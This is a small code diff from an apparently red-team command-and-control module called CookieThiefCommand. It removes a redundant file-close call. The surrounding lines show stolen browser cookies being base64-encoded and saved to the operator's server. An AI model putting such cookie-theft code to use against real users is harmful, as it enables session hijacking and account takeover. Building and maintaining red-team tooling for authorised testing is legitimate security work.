@@ -161,7 +161,6 @@ class CookieThiefCommand(CommandBase):
                     json_file.close()
                     json_file = open("cookies.json", "rb").read()
                     cookie_file_save_resp = await MythicRPC().execute("create_file",task_id=task.id,file=base64.b64encode(json_file).decode(),delete_after_fetch=False,saved_file_name="cookies.json",is_screenshot=False,is_download=False,remote_path=None,host=None)
-                    json_file.close()
                     if cookie_file_save_resp.status == "success":
                         await MythicRPC().execute("create_output",task_id=task.id,output="Cookie file saved to files")
                     else:
